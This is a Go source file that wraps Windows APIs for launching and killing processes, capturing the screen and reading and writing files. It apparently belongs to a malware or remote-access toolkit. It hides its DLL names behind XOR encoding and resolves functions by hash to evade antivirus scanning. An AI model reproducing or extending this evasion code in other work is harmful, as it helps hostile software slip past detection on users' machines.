package winapiV2

import (
	"syscall"
	"unsafe"
)

type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors *RGBQUAD
}

type RGBQUAD struct {
	RgbBlue     byte
	RgbGreen    byte
	RgbRed      byte
	RgbReserved byte
}

var (
	str1 = DecryptString(". 7+ )vw")
	str2 = "U"+DecryptString("6 7vw")
	str3 = "G"+DecryptString("!,vw")
	kernel32                   = syscall.NewLazyDLL(str1+".dll")
	procCreateProcessW         = GetFunctionAddressbyHash(str1, 0xfbaf90cf)
	procWaitForSingleObject    = GetFunctionAddressbyHash(str1, 0xdf1b3da)
	procTerminateProcess 	   = GetFunctionAddressbyHash(str1, 0xf3c179ad)
	procOpenProcess 		   = GetFunctionAddressbyHash(str1, 0x8b21e0b6)
	procGetSystemMetrics 	   = GetFunctionAddressbyHash(str2, 0x287c6401)
	procGetDC 				   = GetFunctionAddressbyHash(str2, 0xd2b106c)
	procCreateCompatibleDC     = GetFunctionAddressbyHash(str3, 0xd0b24920)
	procCreateCompatibleBitmap = GetFunctionAddressbyHash(str3, 0xe37af6)
	procSelectObject 		   = GetFunctionAddressbyHash(str3, 0x96a6b43c)
	procBitBlt 				   = GetFunctionAddressbyHash(str3, 0xa72badc6)
	procDeleteDC 			   = GetFunctionAddressbyHash(str3, 0xb2fa1ebf)
	procReleaseDC 			   = GetFunctionAddressbyHash(str2, 0x6fbc050d)
	procDeleteObject 		   = GetFunctionAddressbyHash(str3, 0xe619cf2f)
	procSetProcessDPIAware	   = GetFunctionAddressbyHash(str2, 0xf96c94bd)
	procGetDIBits 			   = GetFunctionAddressbyHash(str3, 0xd4676c24)
	loadLibraryA               = kernel32.NewProc("LoadLibraryA")
	procCreateFileW 		   = GetFunctionAddressbyHash(str1, 0x687d2110)
	procWriteFile 			   = GetFunctionAddressbyHash(str1, 0xf1d207d0)
	procReadFile 			   = GetFunctionAddressbyHash(str1, 0x84d15061)
	procGetFileSize 		   = GetFunctionAddressbyHash(str1, 0x7b813820)
	procGlobalAlloc			   = GetFunctionAddressbyHash(str1, 0x38379421)
	procGlobalFree			   = GetFunctionAddressbyHash(str1, 0x47886698)
	procGlobalLock			   = GetFunctionAddressbyHash(str1, 0x478ba3df)
	procGlobalUnlock		   = GetFunctionAddressbyHash(str1, 0x6df57622)
)

const (
	CREATE_NEW_CONSOLE		= 0x00000010
	CREATE_NO_WINDOW		= 0x08000000
	PROCESS_ALL_ACCESS  	= 0x1F0FFF
	PROCESS_TERMINATE   	= 0x0001
	SM_XVIRTUALSCREEN   	= 76
	SM_YVIRTUALSCREEN   	= 77
	SM_CXVIRTUALSCREEN  	= 78
	SM_CYVIRTUALSCREEN  	= 79
	SRCCOPY        = 0x00CC0020
	GENERIC_WRITE 			= 0x40000000
	GENERIC_READ 			= 0x80000000
	CREATE_ALWAYS 			= 2
	OPEN_EXISTING 			= 3
	OPEN_ALWAYS				= 4
	FILE_ATTRIBUTE_NORMAL	= 0x80
	BI_RGB 					= 0
	DIB_RGB_COLORS 			= 0
	GMEM_MOVEABLE 			= 0x0002

)

func CreateProcessW(appName *uint16, cmdLine *uint16, procAttrs *syscall.SecurityAttributes, threadAttrs *syscall.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *syscall.StartupInfo, procInfo *syscall.ProcessInformation) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procCreateProcessW,
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(unsafe.Pointer(procAttrs)),
		uintptr(unsafe.Pointer(threadAttrs)),
		uintptr(boolToUintptr(inheritHandles)),
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(currentDir)),
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(procInfo)),
		)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}

func WaitForSingleObject(handle syscall.Handle, milliseconds uint32) (uint32, error) {
	r1, _, e1 := syscall.SyscallN(procWaitForSingleObject,
		uintptr(handle),
		uintptr(milliseconds),
		)
	if r1 == 0xFFFFFFFF {
		if e1 != 0 {
			return 0, syscall.Errno(e1)
		}
		return 0, syscall.EINVAL
	}
	return uint32(r1), nil
}

func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procOpenProcess,
		uintptr(desiredAccess),
		uintptr(boolToUintptr(inheritHandle)),
		uintptr(processId),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func TerminateProcess(handle syscall.Handle, exitCode uint32) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procTerminateProcess,
		uintptr(handle),
		uintptr(exitCode),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func GetSystemMetrics(index int32) (int32, error) {
	r1, _, e1 := syscall.SyscallN(procGetSystemMetrics,
		uintptr(index),
	)
	if r1 == 0 {
		if e1 != 0 {
			return -100, syscall.Errno(e1)
		}
	return int32(r1), nil
}
	return int32(r1), nil
}

func GetDC(hwnd syscall.Handle) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procGetDC,
		uintptr(hwnd),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func CreateCompatibleDC(hdc syscall.Handle) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procCreateCompatibleDC,
		uintptr(hdc),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func CreateCompatibleBitmap(hdc syscall.Handle, width, height int32) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procCreateCompatibleBitmap,
		uintptr(hdc),
		uintptr(width),
		uintptr(height),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func SelectObject(hdc syscall.Handle, hgdiobj syscall.Handle) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procSelectObject,
		uintptr(hdc),
		uintptr(hgdiobj),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func BitBlt(hdc syscall.Handle, xDest, yDest, width, height int32, hdcSrc syscall.Handle, xSrc, ySrc int32, rop uint32) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procBitBlt,
		uintptr(hdc),
		uintptr(xDest),
		uintptr(yDest),
		uintptr(width),
		uintptr(height),
		uintptr(hdcSrc),
		uintptr(xSrc),
		uintptr(ySrc),
		uintptr(rop),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func DeleteDC(hdc syscall.Handle) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procDeleteDC,
		uintptr(hdc),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func ReleaseDC(hwnd syscall.Handle, hdc syscall.Handle) (int32, error) {
	r1, _, e1 := syscall.SyscallN(procReleaseDC,
		uintptr(hwnd),
		uintptr(hdc),
	)
	if r1 == 0 {
		if e1 != 0 {
			return -100, syscall.Errno(e1)
		}
	}
	return int32(r1), nil
}

func DeleteObject(hObject syscall.Handle) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procDeleteObject,
		uintptr(hObject),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func SetProcessDPIAware() (bool, error) {
	r1, _, e1 := syscall.SyscallN(procSetProcessDPIAware)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func CreateFile (fileName *uint16, desiredAccess uint32, shareMode uint32, securityAttributes *syscall.SecurityAttributes, creationDisposition uint32, flagsAndAttributes uint32, templateFile syscall.Handle) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procCreateFileW,
		uintptr(unsafe.Pointer(fileName)),
		uintptr(desiredAccess),
		uintptr(shareMode),
		uintptr(unsafe.Pointer(securityAttributes)),
		uintptr(creationDisposition),
		uintptr(flagsAndAttributes),
		uintptr(templateFile),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func WriteFile (handle syscall.Handle, buffer *byte, numberOfBytesToWrite uint32, numberOfBytesWritten *uint32, overlapped *syscall.Overlapped) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procWriteFile,
		uintptr(handle),
		uintptr(unsafe.Pointer(buffer)),
		uintptr(numberOfBytesToWrite),
		uintptr(unsafe.Pointer(numberOfBytesWritten)),
		uintptr(unsafe.Pointer(overlapped)),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func ReadFile (handle syscall.Handle, buffer *byte, numberOfBytesToRead uint32, numberOfBytesRead *uint32, overlapped *syscall.Overlapped) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procReadFile,
		uintptr(handle),
		uintptr(unsafe.Pointer(buffer)),
		uintptr(numberOfBytesToRead),
		uintptr(unsafe.Pointer(numberOfBytesRead)),
		uintptr(unsafe.Pointer(overlapped)),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func GetFileSize (handle syscall.Handle, fileSizeHigh *uint32) (uint32, error) {
	r1, _, e1 := syscall.SyscallN(procGetFileSize,
		uintptr(handle),
		uintptr(unsafe.Pointer(fileSizeHigh)),
	)
	if r1 == 0xFFFFFFFF {
		if e1 != 0 {
			return 0, syscall.Errno(e1)
		}
		return 0, syscall.EINVAL
	}
	return uint32(r1), nil
}

func GetDIBits (hdc syscall.Handle, hbitmap syscall.Handle, startScan, numScans uint32, bits *byte, info *BITMAPINFO, colorUse uint32) (int32, error) {
	r1, _, e1 := syscall.SyscallN(procGetDIBits,
		uintptr(hdc),
		uintptr(hbitmap),
		uintptr(startScan),
		uintptr(numScans),
		uintptr(unsafe.Pointer(bits)),
		uintptr(unsafe.Pointer(info)),
		uintptr(colorUse),
	)
	if r1 == 0 {
		if e1 != 0 {
			return -100, syscall.Errno(e1)
		}
	}
	return int32(r1), nil
}

func GlobalAlloc (flags uint32, bytes uintptr) (syscall.Handle, error) {
	r1, _, e1 := syscall.SyscallN(procGlobalAlloc,
		uintptr(flags),
		uintptr(bytes),
	)
	if r1 == 0 {
		return 0, e1
	}
	return syscall.Handle(r1), nil
}

func GlobalFree (hmem syscall.Handle) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procGlobalFree,
		uintptr(hmem),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func GlobalLock (hmem syscall.Handle) (uintptr, error) {
	r1, _, e1 := syscall.SyscallN(procGlobalLock,
		uintptr(hmem),
	)
	if r1 == 0 {
		return 0, e1
	}
	return uintptr(r1), nil
}

func GlobalUnlock (hmem syscall.Handle) (bool, error) {
	r1, _, e1 := syscall.SyscallN(procGlobalUnlock,
		uintptr(hmem),
	)
	if r1 == 0 {
		if e1 != 0 {
			return false, syscall.Errno(e1)
		}
		return false, syscall.EINVAL
	}
	return true, nil
}

func DecryptString(s string) string {
	key := byte(0x45)
	decoded := make([]byte, len(s))
	for i := range s {
		decoded[i] = s[i] ^ key
	}
	return string(decoded)
}